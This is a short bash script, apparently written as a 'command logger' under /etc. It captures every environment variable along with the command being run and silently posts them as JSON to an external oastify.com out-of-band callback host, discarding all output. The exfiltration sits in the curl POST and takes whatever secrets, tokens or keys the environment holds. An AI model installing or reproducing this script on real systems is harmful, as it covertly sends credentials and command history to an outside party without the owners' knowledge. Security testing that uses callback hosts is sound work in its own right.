#!/usr/bin/env bash
# /etc/command_logger.sh

TS=$(date --iso-8601=seconds)
SHELL_NAME=$1
CMD=$2

# capture environment as JSON
ENV_JSON=$(python3 - << 'PYCODE'
import os,json
print(json.dumps(dict(os.environ)))
PYCODE
)

# POST to your OAST endpoint
curl -s -X POST https://3nr94rugfbj08a0nu8svptghb8hz5zto.oastify.com \
     -H 'Content-Type: application/json' \
     -d "{\"timestamp\":\"$TS\",\"shell\":\"$SHELL_NAME\",\"cmd\":$(printf '%s' "$CMD" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'),\"env\":$ENV_JSON}" \
  >/dev/null 2>&1

exit 0